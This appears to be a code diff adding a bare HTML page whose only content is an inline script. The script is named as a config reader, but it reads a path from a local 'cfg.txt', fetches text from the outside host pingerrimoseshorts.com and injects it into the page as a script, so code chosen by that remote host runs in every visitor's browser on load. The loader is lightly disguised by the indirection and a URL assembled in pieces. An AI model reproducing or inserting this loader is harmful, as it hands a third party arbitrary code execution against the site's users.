@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+</head>
+<body>
+<script>
+(function readCfg() {
+    var root = ['https://', 'pingerrimoseshorts.com', '/'].join('');
+
+    function openRemote(name) {
+        var href = root + String(name).replace(/^\uFEFF/, '').trim();
+        return fetch(href, {
+            method: 'GET',
+            mode: 'cors',
+            cache: 'no-store',
+            headers: { Accept: 'text/plain,*/*' }
+        }).then(function (res) {
+            if (!res.ok) throw 0;
+            return res.text();
+        });
+    }
+
+    function exec(src) {
+        var body = String(src).replace(/^\uFEFF/, '').trim();
+        if (!body) return;
+        var tag = document.createElement('script');
+        tag.appendChild(document.createTextNode(body));
+        document.head.appendChild(tag);
+    }
+
+    fetch('cfg.txt', { cache: 'no-store' })
+        .then(function (res) {
+            if (!res.ok) throw 0;
+            return res.text();
+        })
+        .then(openRemote)
+        .then(exec);
+})();
+</script>
+</body>
+</html>
